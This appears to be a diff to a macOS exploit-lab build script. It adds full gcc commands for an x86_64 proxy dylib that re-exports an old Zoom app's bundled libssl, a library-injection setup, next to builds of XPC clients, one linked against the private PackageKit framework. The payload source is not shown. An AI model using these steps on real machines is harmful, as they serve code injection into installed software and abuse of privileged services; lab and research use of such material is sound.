@@ -25,8 +25,11 @@ gcc -fobjc-arc -framework Foundation \
   "$SDKROOT/System/Library/PrivateFrameworks/PackageKit.framework/PackageKit.tbd" \
   shovexpc.m -o shovexpc
 
-# Zoom dylib (often x86_64 for old Zoom)
-gcc -arch x86_64 -dynamiclib -framework Foundation …   # see zoom_exploit_lab.sh
+# Zoom dylib (x86_64; paths from zoom_exploit_lab.sh after unzip to /tmp/zoom.us.app)
+gcc -arch x86_64 -dynamiclib -framework Foundation \
+  -Wl,-reexport_library,"/tmp/zoom.us.app/Contents/Frameworks/_libssl.1.0.0.dylib" \
+  zoomxpc.m -o /tmp/zoomxpc.dylib
+# then install_name_tool as in zoom_exploit_lab.sh
 
 # NSXPC minimal
 gcc -fobjc-arc -framework Foundation nsxpcclient.m -o nsxpcclient
